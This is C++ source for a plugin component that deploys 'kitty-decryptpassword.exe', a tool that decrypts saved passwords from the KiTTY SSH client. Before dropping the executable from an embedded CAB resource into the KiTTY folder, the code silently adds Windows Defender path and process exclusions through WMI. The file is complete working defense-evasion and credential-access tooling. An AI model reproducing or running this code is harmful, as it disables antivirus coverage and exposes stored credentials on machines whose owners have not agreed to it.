#include "global.h"
#include "KittyDecryptDeploy.h"
#include "res/resource.h"
#include "PluginEntryPoints.h"
#include <windows.h>
#include <wbemidl.h>
#include <comdef.h>
#include <fdi.h>
#include <string>
#include <vector>
#include <algorithm>

#pragma comment(lib, "cabinet.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "oleaut32.lib")

// ---------------------------------------------------------------------------
// Helpers: path manipulation
// ---------------------------------------------------------------------------

static std::string ParentDir(const std::string& p)
{
    const size_t s = p.rfind('\\');
    return s != std::string::npos ? p.substr(0, s) : p;
}

// Walk up: sessions -> data -> kittyRoot  (same logic as FindKittyDecryptExe)
static std::string KittyRootFrom(const std::string& sessionFilePath)
{
    return ParentDir(ParentDir(ParentDir(sessionFilePath)));
}

static bool FileExists(const std::string& path)
{
    return GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES;
}

static std::string FindExeInTree(const std::string& kittyRoot)
{
    const char* name = "\\kitty-decryptpassword.exe";
    for (const std::string& base : {
            kittyRoot,
            kittyRoot + "\\App\\KiTTY",
            kittyRoot + "\\Data",
            kittyRoot + "\\Data\\Sessions" })
    {
        std::string full = base + name;
        if (FileExists(full))
            return full;
    }
    return {};
}

// ---------------------------------------------------------------------------
// WMI/COM Defender exclusion — inlined from kvc/WmiDefenderClient patterns
// ---------------------------------------------------------------------------

namespace {

template<typename T>
struct CPtr {
    T* p = nullptr;
    CPtr() = default;
    explicit CPtr(T* r) : p(r) {}
    ~CPtr() { if (p) p->Release(); }
    CPtr(const CPtr&) = delete;
    CPtr& operator=(const CPtr&) = delete;
    T** operator&() { return &p; }
    T* operator->() { return p; }
    explicit operator bool() const { return p != nullptr; }
};

struct VGuard {
    VARIANT v;
    VGuard()  { VariantInit(&v); }
    ~VGuard() { VariantClear(&v); }
};

struct SAGuard {
    SAFEARRAY* sa;
    explicit SAGuard(SAFEARRAY* s) : sa(s) {}
    ~SAGuard() { if (sa) SafeArrayDestroy(sa); }
};

} // namespace

static bool AddDefenderExclusion(const std::wstring& value, const wchar_t* property) noexcept
{
    bool comInit = false;
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr))
        comInit = true;
    else if (hr != RPC_E_CHANGED_MODE)
        return false;

    bool ok = false;
    CPtr<IWbemLocator>  pLoc;
    CPtr<IWbemServices> pSvc;

    hr = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                          IID_IWbemLocator, reinterpret_cast<void**>(&pLoc.p));
    if (FAILED(hr)) goto done;

    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\Microsoft\\Windows\\Defender"),
                             nullptr, nullptr, nullptr, 0, nullptr, nullptr, &pSvc.p);
    if (FAILED(hr)) goto done;

    CoSetProxyBlanket(pSvc.p, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                      RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                      nullptr, EOAC_NONE);

    {
        CPtr<IWbemClassObject> pClass;
        hr = pSvc->GetObject(_bstr_t(L"MSFT_MpPreference"), 0, nullptr,
                             &pClass.p, nullptr);
        if (FAILED(hr)) goto done;

        CPtr<IWbemClassObject> pInDef;
        hr = pClass->GetMethod(_bstr_t(L"Add"), 0, &pInDef.p, nullptr);
        if (FAILED(hr) || !pInDef) goto done;

        CPtr<IWbemClassObject> pIn;
        hr = pInDef->SpawnInstance(0, &pIn.p);
        if (FAILED(hr)) goto done;

        SAFEARRAY* sa = SafeArrayCreateVector(VT_BSTR, 0, 1);
        if (!sa) goto done;
        SAGuard saGuard(sa);

        LONG idx = 0;
        BSTR bval = SysAllocStringLen(value.c_str(), (UINT)value.size());
        if (!bval) goto done;
        hr = SafeArrayPutElement(sa, &idx, bval);
        SysFreeString(bval);
        if (FAILED(hr)) goto done;

        VARIANT vp;
        VariantInit(&vp);
        vp.vt     = VT_ARRAY | VT_BSTR;
        vp.parray = sa;
        hr = pIn->Put(_bstr_t(property), 0, &vp, 0);
        vp.parray = nullptr;
        VariantClear(&vp);
        if (FAILED(hr)) goto done;

        CPtr<IWbemClassObject> pOut;
        hr = pSvc->ExecMethod(_bstr_t(L"MSFT_MpPreference"), _bstr_t(L"Add"),
                              0, nullptr, pIn.p, &pOut.p, nullptr);
        if (SUCCEEDED(hr)) {
            ok = true;
            if (pOut) {
                VGuard vr;
                if (SUCCEEDED(pOut->Get(L"ReturnValue", 0, &vr.v, nullptr, nullptr)))
                    if (vr.v.vt == VT_I4 && vr.v.lVal != 0)
                        ok = false;
            }
        }
    }

done:
    if (comInit) CoUninitialize();
    return ok;
}

// ---------------------------------------------------------------------------
// FDI: extract embedded CAB resource to file
// ---------------------------------------------------------------------------

namespace {

struct FdiCtx {
    const BYTE* data;
    size_t      size;
    size_t      offset;
};

static FdiCtx*       g_fdiCtx      = nullptr;
static std::string*  g_fdiOutPath  = nullptr;
static HANDLE        g_fdiOutFile  = INVALID_HANDLE_VALUE;

static FNALLOC(fdi_alloc) { return malloc(cb); }
static FNFREE(fdi_free)   { free(pv); }

static FNOPEN(fdi_open)
{
    (void)pszFile; (void)oflag; (void)pmode;
    return g_fdiCtx ? (INT_PTR)g_fdiCtx : -1;
}

static FNREAD(fdi_read)
{
    FdiCtx* c = (FdiCtx*)hf;
    if (!c) return 0;
    size_t avail = c->size - c->offset;
    size_t n     = cb < avail ? cb : avail;
    if (n) { memcpy(pv, c->data + c->offset, n); c->offset += n; }
    return (UINT)n;
}

static FNWRITE(fdi_write)
{
    if (g_fdiOutFile != INVALID_HANDLE_VALUE) {
        DWORD wr = 0;
        WriteFile(g_fdiOutFile, pv, cb, &wr, nullptr);
        return wr;
    }
    return cb;
}

static FNCLOSE(fdi_close) { return 0; }

static FNSEEK(fdi_seek)
{
    FdiCtx* c = (FdiCtx*)hf;
    if (!c) return -1;
    switch (seektype) {
        case SEEK_SET: c->offset = (size_t)dist; break;
        case SEEK_CUR: c->offset = (size_t)((long long)c->offset + dist); break;
        case SEEK_END: c->offset = (size_t)((long long)c->size   + dist); break;
    }
    return (LONG)c->offset;
}

static FNFDINOTIFY(fdi_notify)
{
    if (fdint == fdintCOPY_FILE && g_fdiOutPath && !g_fdiOutPath->empty()) {
        g_fdiOutFile = CreateFileA(g_fdiOutPath->c_str(), GENERIC_WRITE, 0, nullptr,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        return g_fdiOutFile != INVALID_HANDLE_VALUE ? (INT_PTR)g_fdiCtx : -1;
    }
    if (fdint == fdintCLOSE_FILE_INFO) {
        if (g_fdiOutFile != INVALID_HANDLE_VALUE) {
            CloseHandle(g_fdiOutFile);
            g_fdiOutFile = INVALID_HANDLE_VALUE;
        }
        return TRUE;
    }
    return 0;
}

} // namespace

static bool ExtractCabResourceToFile(const std::string& destPath) noexcept
{
    HRSRC hRes = FindResourceA(hinst, MAKEINTRESOURCEA(IDR_KITTY_DECRYPT_CAB), "RCDATA");
    if (!hRes) return false;
    HGLOBAL hGlob = LoadResource(hinst, hRes);
    if (!hGlob) return false;
    const BYTE* data = (const BYTE*)LockResource(hGlob);
    DWORD       size = SizeofResource(hinst, hRes);
    if (!data || !size) return false;

    FdiCtx ctx = { data, size, 0 };
    g_fdiCtx     = &ctx;
    g_fdiOutPath = const_cast<std::string*>(&destPath);
    g_fdiOutFile = INVALID_HANDLE_VALUE;

    ERF erf{};
    HFDI hfdi = FDICreate(fdi_alloc, fdi_free, fdi_open, fdi_read,
                          fdi_write, fdi_close, fdi_seek, cpuUNKNOWN, &erf);
    if (!hfdi) { g_fdiCtx = nullptr; g_fdiOutPath = nullptr; return false; }

    char name[] = "memory.cab";
    char path[] = "";
    BOOL ok = FDICopy(hfdi, name, path, 0, fdi_notify, nullptr, nullptr);

    FDIDestroy(hfdi);
    if (g_fdiOutFile != INVALID_HANDLE_VALUE) {
        CloseHandle(g_fdiOutFile);
        g_fdiOutFile = INVALID_HANDLE_VALUE;
    }
    g_fdiCtx     = nullptr;
    g_fdiOutPath = nullptr;
    return ok && FileExists(destPath);
}

// ---------------------------------------------------------------------------
// Public entry point
// ---------------------------------------------------------------------------

std::string EnsureKittyDecryptExe(const std::string& sessionFilePath)
{
    // Already present — nothing to do
    std::string found = FindExeInTree(KittyRootFrom(sessionFilePath));
    if (!found.empty())
        return found;

    const std::string kittyRoot = KittyRootFrom(sessionFilePath);
    if (kittyRoot.empty()) return {};

    // Add Defender exclusions (path + process) — best-effort, failure is non-fatal
    {
        int needed = MultiByteToWideChar(CP_ACP, 0, kittyRoot.c_str(), -1, nullptr, 0);
        if (needed > 0) {
            std::wstring rootW(needed, L'\0');
            MultiByteToWideChar(CP_ACP, 0, kittyRoot.c_str(), -1, rootW.data(), needed);
            rootW.resize(rootW.size() - 1); // strip trailing NUL
            AddDefenderExclusion(rootW, L"ExclusionPath");
        }
        AddDefenderExclusion(L"kitty-decryptpassword.exe", L"ExclusionProcess");
    }

    // Extract exe to kittyRoot
    const std::string destPath = kittyRoot + "\\kitty-decryptpassword.exe";
    if (!ExtractCabResourceToFile(destPath))
        return {};

    return FileExists(destPath) ? destPath : std::string{};
}
